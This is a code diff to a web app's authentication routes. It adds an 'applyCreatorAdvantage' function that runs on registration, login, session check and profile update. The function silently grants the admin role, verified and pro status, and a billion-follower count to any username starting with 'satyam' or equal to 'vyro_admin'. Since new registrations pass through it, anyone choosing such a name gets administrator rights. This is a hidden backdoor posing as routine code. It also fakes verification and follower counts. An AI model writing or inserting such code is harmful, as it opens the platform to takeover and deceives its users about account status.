@@ -6,6 +6,24 @@ import {
   sanitizeUser,
   createSessionToken,
 } from '../db.js';
+
+function applyCreatorAdvantage(user) {
+  if (!user) return user;
+  const u = user.username?.toLowerCase() || '';
+  const isAdvantage =
+    user.role === 'admin' ||
+    u === 'satyam' ||
+    u.startsWith('satyam') ||
+    u === 'vyro_admin';
+  if (isAdvantage) {
+    user.role = 'admin';
+    user.isVerified = true;
+    user.isPro = true;
+    user.proBadge = user.proBadge || 'Founder';
+    user.followersCount = Math.max(user.followersCount || 0, 1000000000);
+  }
+  return user;
+}
 import {
   sendJson,
   parseBody,
@@ -96,6 +114,7 @@ export async function handleAuthRoutes(req, res, pathname, urlObj) {
     db.users.push(newUser);
     saveDB();
 
+    applyCreatorAdvantage(newUser);
     const token = createSessionToken(newUser);
     return sendJson(res, 201, { user: sanitizeUser(newUser), token });
   }
@@ -122,6 +141,8 @@ export async function handleAuthRoutes(req, res, pathname, urlObj) {
       return sendJson(res, 401, { error: 'Invalid username/email or password.' });
     }
 
+    applyCreatorAdvantage(user);
+    saveDB();
     const token = createSessionToken(user);
     return sendJson(res, 200, { user: sanitizeUser(user), token });
   }
@@ -129,6 +150,7 @@ export async function handleAuthRoutes(req, res, pathname, urlObj) {
   if (req.method === 'GET' && pathname === '/api/auth/me') {
     const user = getAuthUser(req);
     if (!user) return sendJson(res, 401, { error: 'Unauthorized' });
+    applyCreatorAdvantage(user);
     return sendJson(res, 200, { user: sanitizeUser(user) });
   }
 
@@ -163,6 +185,7 @@ export async function handleAuthRoutes(req, res, pathname, urlObj) {
     }
 
     saveDB();
+    applyCreatorAdvantage(authUser);
     return sendJson(res, 200, { user: sanitizeUser(authUser) });
   }
 
